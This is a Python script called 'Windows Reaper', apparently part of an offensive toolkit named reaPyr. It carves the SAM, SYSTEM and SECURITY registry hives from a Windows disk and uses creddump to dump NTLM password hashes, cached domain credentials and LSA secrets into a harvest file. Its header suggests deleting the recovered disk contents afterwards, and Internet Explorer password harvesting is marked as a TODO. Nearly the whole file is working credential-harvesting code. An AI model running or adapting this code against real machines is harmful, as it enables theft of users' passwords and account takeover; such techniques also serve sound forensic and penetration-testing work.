"""

	Windows Reaper

	This script makes use of the disk handed to us by reaPyr and
	attempts to carve out the Windows NT password hashes, as well
	as any cached/saved passwords from IE

	Food for thought:

	* Delete the disk_rec contents when completed

	* copy the win_hrvst.txt file somewhere to the root
	directory when completed.

"""
import sys

sys.path.append("./windows/creddump")

from framework.win32.domcachedump import dump_file_hashes as cachedump
from framework.win32.hashdump import dump_file_hashes as pwdump
from framework.win32.lsasecrets import get_file_secrets as lsadump

# http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/142812
FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])

def dump(src, length=8):
	N=0; result=''
	while src:
		s,src = src[:length],src[length:]
		hexa = ' '.join(["%02X"%ord(x) for x in s])
		s = s.translate(FILTER)
		result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
		N+=length
	return result


def reap(d):
	# Registry hives containing NTLM password hashes.
	fout = open("./windows/win_hrvst.txt",'a')

	sam_db = "/Windows/system32/config/SAM"
	sys_db = "/Windows/system32/config/system"
	sec_db = "/Windows/system32/config/security"

	d.carve(sam_db)
	d.carve(sys_db)
	d.carve(sec_db)

	"""
	 Now, pass off the registry files we just obtained to creddump-0.3
	 https://code.google.com/p/creddump/
	 Thanks Internet!
	"""

	# Dump the file hashes
	hashes = pwdump("./disk_rec/system","./disk_rec/SAM")
	if hashes:
		fout.write("#"*30+"SAM HASHES"+"#"*30)
		fout.write(hashes)
		fout.write("\n\n")

	# Dump any cached credentials
	caches = cachedump("./disk_rec/system","./disk_rec/security")
	if caches and 'ERR' not in caches:
		fout.write("#"*30+"CACHED PWS"+"#"*30)
		fout.write(caches)
		fout.write("\n\n")


	# LSA Secrets is just a little different, we port the code from lsadump.pu
	# provided by creddump, in order to redirect the output to our hrvst file.
	# Hex dump code from
	secrets = lsadump("./disk_rec/system","./disk_rec/security")
	if secrets != []:
		fout.write("#"*30+"CACHED PWS"+"#"*30)
		for k in secrets:
			fout.write(k)
			fout.write(dump(secrets[k], length=16))
		fout.write("\n\n")

	"""
	Begin IE Harvesting - TODO
	"""

